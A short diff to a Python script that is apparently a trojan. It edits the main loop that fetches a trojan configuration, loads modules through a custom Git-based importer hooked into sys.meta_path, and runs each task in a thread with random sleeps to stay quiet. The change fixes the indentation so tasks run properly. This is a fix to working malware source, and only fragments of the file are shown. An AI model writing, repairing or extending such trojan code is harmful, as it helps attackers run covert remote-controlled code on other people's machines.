@@ -1,5 +1,5 @@
 #!/usr/bin/python
-#  -*- coding: utf-8 -*-
+#coding=utf-8
 
 import json
 import base64
@@ -99,9 +99,9 @@ sys.meta_path = [GitImporter()]
 while True:
     if task_queue.empty():
         config = get_trojan_config()
-    for task in config:
-        t = threading.Thread(target=module_runner,args=(task['module'],))
-        t.start()
-        time.sleep(random.randint(1,10))
+        for task in config:
+            t = threading.Thread(target=module_runner,args=(task['module'],))
+            t.start()
+            time.sleep(random.randint(1,10))
 
     time.sleep(random.randint(1000,10000))
